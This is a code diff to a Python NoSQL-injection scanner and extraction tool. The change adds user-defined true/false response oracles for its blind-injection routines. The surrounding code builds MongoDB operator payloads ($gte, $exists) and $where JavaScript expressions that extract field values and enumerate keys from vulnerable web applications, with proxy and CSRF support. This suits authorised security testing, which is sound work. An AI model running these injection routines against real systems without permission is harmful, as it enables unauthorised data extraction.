@@ -88,6 +88,10 @@ def args():
         ["--csrfRegex", "Regex with one capture group for the token (default: derived from --csrfField)"],
         ["--proxy", "Route every request through this proxy, e.g. http://127.0.0.1:8080 (Burp)"],
         ["--retries", "Retries on a transient connection failure, with backoff (default 2)"],
+        ["--trueString", "Substring present only on a TRUE/match response (deterministic oracle)"],
+        ["--falseString", "Substring present only on a FALSE/no-match response"],
+        ["--trueRegex", "Regex that matches only the TRUE response"],
+        ["--trueCode", "HTTP status code that means TRUE/match"],
     ]
 
 
@@ -191,7 +195,8 @@ def parse_raw_request(text, force_ssl=False):
 
 class Ctx:
     def __init__(self, headers=None, verify=False, csrf=None, timeout=15, session=None,
-                 proxies=None, retries=2, cookies=None):
+                 proxies=None, retries=2, cookies=None,
+                 assert_true=None, assert_false=None, assert_regex=None, assert_code=None):
         self.session = session or requests.Session()
         self.headers = headers
         self.verify = verify
@@ -201,6 +206,11 @@ class Ctx:
         self.retries = retries    # transient-failure retries with backoff
         self.cookies = cookies    # dict of cookies sent on every request
         self.dynamic = []         # (prefix,suffix) markings of per-request-varying regions
+        # User-assertable oracle (overrides the fuzzy comparison when set):
+        self.assert_true = assert_true     # substring present only on a TRUE/match page
+        self.assert_false = assert_false   # substring present only on a FALSE/no-match page
+        self.assert_regex = assert_regex   # regex that matches only the TRUE page
+        self.assert_code = assert_code     # HTTP status that means TRUE
 
 
 _DYN_LEN = 32
@@ -404,7 +414,28 @@ class Noise:
         self.has_cookie = any(p.cookies for p in probes)
 
 
-def _signal(true_p, noise):
+def _asserted(ctx, probe):
+    # User-assertable oracle: a deterministic True/False from --true/false markers
+    # (None when no assertion is configured, so callers fall back to the fuzzy path).
+    if ctx is None:
+        return None
+    if ctx.assert_code is not None:
+        return probe.status == ctx.assert_code
+    if ctx.assert_true is not None:
+        return ctx.assert_true in probe.body
+    if ctx.assert_false is not None:
+        return ctx.assert_false not in probe.body
+    if ctx.assert_regex is not None:
+        return re.search(ctx.assert_regex, probe.body) is not None
+    return None
+
+
+def _signal(true_p, noise, ctx=None):
+    a = _asserted(ctx, true_p)
+    if a is not None:
+        if a and not _asserted(ctx, noise.ref):
+            return (["matches user-asserted oracle"], True)
+        return ([], False)
     reasons = []
     positive = False
     if true_p.status not in noise.statuses:
@@ -428,7 +459,10 @@ def _signal(true_p, noise):
     return reasons, positive
 
 
-def _states_differ(a, b):
+def _states_differ(a, b, ctx=None):
+    va = _asserted(ctx, a)
+    if va is not None:
+        return va != _asserted(ctx, b)
     # Boolean oracle viable between a (match) and b (no-match)?
     if a.status != b.status and a.status not in _BLOCKING:
         return True
@@ -441,7 +475,10 @@ def _states_differ(a, b):
     return _similarity(a.body, b.body) < 0.95
 
 
-def _classify_true(probe, true_sig, false_sig):
+def _classify_true(probe, true_sig, false_sig, ctx=None):
+    a = _asserted(ctx, probe)
+    if a is not None:
+        return a
     if probe.status == true_sig.status and probe.status != false_sig.status:
         return True
     if probe.status == false_sig.status and probe.status != true_sig.status:
@@ -574,14 +611,14 @@ def detect(base_url, method, fields_literal, headers=None, verify=False,
                 t = _send(ctx, method, base_url, vector, spec)
             except requests.RequestException:
                 continue
-            reasons, positive = _signal(t, noise)
+            reasons, positive = _signal(t, noise, ctx)
             if not reasons:
                 continue
             try:
                 t2 = _send(ctx, method, base_url, vector, spec)
             except requests.RequestException:
                 continue
-            reasons2, positive2 = _signal(t2, noise)
+            reasons2, positive2 = _signal(t2, noise, ctx)
             if not reasons2:
                 continue
             findings.append({
@@ -788,12 +825,12 @@ def _regex_is_true(ctx, method, base_url, vector, fields_literal, field, pin, ex
         false_sig = probe("^" + _rand(16) + "$")
     except requests.RequestException:
         return None
-    if not _states_differ(true_sig, false_sig):
+    if not _states_differ(true_sig, false_sig, ctx):
         return None
 
     def is_true(pattern):
         try:
-            return _classify_true(probe(pattern), true_sig, false_sig)
+            return _classify_true(probe(pattern), true_sig, false_sig, ctx)
         except requests.RequestException:
             return False
     return is_true
@@ -808,12 +845,12 @@ def _extract_typed(ctx, method, base_url, vector, fields_literal, field, pin, ex
         ref_false = probe(("lit", _rand(16)))
     except requests.RequestException:
         return None
-    if not _states_differ(ref_true, ref_false):
+    if not _states_differ(ref_true, ref_false, ctx):
         return None
 
     def gte(n):
         try:
-            return _classify_true(probe(("ops", {"$gte": n})), ref_true, ref_false)
+            return _classify_true(probe(("ops", {"$gte": n})), ref_true, ref_false, ctx)
         except requests.RequestException:
             return False
 
@@ -830,7 +867,7 @@ def _extract_typed(ctx, method, base_url, vector, fields_literal, field, pin, ex
 
     for bval in (True, False):           # boolean
         try:
-            if _classify_true(probe(("lit", bval)), ref_true, ref_false):
+            if _classify_true(probe(("lit", bval)), ref_true, ref_false, ctx):
                 return bval
         except requests.RequestException:
             pass
@@ -847,14 +884,14 @@ def _where_is_true(ctx, method, base_url, vector, fields_literal, inj_field, tem
         false_sig = probe("false")
     except requests.RequestException:
         return None
-    if not _states_differ(true_sig, false_sig):
+    if not _states_differ(true_sig, false_sig, ctx):
         return None
 
     def is_true(pattern):
         js_pat = pattern.replace("/", "\\/")
         js = "this.%s!=null && /%s/.test(String(this.%s))" % (target, js_pat, target)
         try:
-            return _classify_true(probe(js), true_sig, false_sig)
+            return _classify_true(probe(js), true_sig, false_sig, ctx)
         except requests.RequestException:
             return False
     return is_true
@@ -892,7 +929,7 @@ def discover_where(ctx, method, base_url, vector, fields_literal, where, maxlen=
         true_sig, false_sig = probe("true"), probe("false")
     except requests.RequestException:
         return []
-    if not _states_differ(true_sig, false_sig):
+    if not _states_differ(true_sig, false_sig, ctx):
         return []
 
     keys = []
@@ -904,7 +941,7 @@ def discover_where(ctx, method, base_url, vector, fields_literal, where, maxlen=
             js = ("Object.keys(this).filter(function(k){return %s.indexOf(k)<0;})"
                   ".some(function(k){return /%s/.test(k);})" % (_excl, jsp))
             try:
-                return _classify_true(probe(js), true_sig, false_sig)
+                return _classify_true(probe(js), true_sig, false_sig, ctx)
             except requests.RequestException:
                 return False
 
@@ -933,9 +970,9 @@ def discover_exists(ctx, method, base_url, vector, fields_literal, wordlist=None
         canary = probe({"nx_" + _rand(): ("ops", {"$exists": True})})  # bogus field
     except requests.RequestException:
         return []
-    if not _states_differ(ref_match, ref_no):
+    if not _states_differ(ref_match, ref_no, ctx):
         return []
-    if _classify_true(canary, ref_match, ref_no):
+    if _classify_true(canary, ref_match, ref_no, ctx):
         return []   # app ignores extra fields (strict-key) -> $exists discovery N/A
 
     found = []
@@ -946,7 +983,7 @@ def discover_exists(ctx, method, base_url, vector, fields_literal, wordlist=None
             p = probe({name: ("ops", {"$exists": True})})
         except requests.RequestException:
             continue
-        if _classify_true(p, ref_match, ref_no):
+        if _classify_true(p, ref_match, ref_no, ctx):
             found.append(name)
             print("    [+] field: %s" % name)
     return found
@@ -966,10 +1003,10 @@ def _body_merges(ctx, method, base_url, vector, fields_literal):
         canary = probe({"nx_" + _rand(): ("ops", {"$exists": True})})
     except requests.RequestException:
         return None
-    if not _states_differ(ref_match, ref_no):
+    if not _states_differ(ref_match, ref_no, ctx):
         return None
     # If requiring a bogus field still matches, the app ignored it -> strict-key.
-    return not _classify_true(canary, ref_match, ref_no)
+    return not _classify_true(canary, ref_match, ref_no, ctx)
 
 
 def discover_fields(ctx, method, base_url, vector, fields_literal, findings):
@@ -1249,6 +1286,7 @@ def run(base_url, method, fields_literal, headers=None, verify=False, args=None,
     delay_ms = 1000
     proxy = None
     retries = 2
+    a_true = a_false = a_regex = a_code = None
     if args is not None:
         cf = getattr(args, "csrfField", None)
         if cf:
@@ -1266,6 +1304,11 @@ def run(base_url, method, fields_literal, headers=None, verify=False, args=None,
             retries = int(getattr(args, "retries", None) or 2)
         except (ValueError, TypeError):
             retries = 2
+        a_true = getattr(args, "trueString", None)
+        a_false = getattr(args, "falseString", None)
+        a_regex = getattr(args, "trueRegex", None)
+        tc = getattr(args, "trueCode", None)
+        a_code = int(tc) if tc and str(tc).isdigit() else None
 
     if csrf:
         fields_literal.pop(csrf["field"], None)
@@ -1287,7 +1330,8 @@ def run(base_url, method, fields_literal, headers=None, verify=False, args=None,
         return []
 
     ctx = Ctx(headers, verify, csrf, timeout=max(15, int(delay_ms / 1000 * 5) + 5),
-              proxies=proxy, retries=retries, cookies=cookies)
+              proxies=proxy, retries=retries, cookies=cookies,
+              assert_true=a_true, assert_false=a_false, assert_regex=a_regex, assert_code=a_code)
     findings = detect(base_url, method, fields_literal, no_where=no_where, ctx=ctx,
                       time_based=time_based, delay_ms=delay_ms,
                       inject_fields=inject_fields, vectors=vectors)
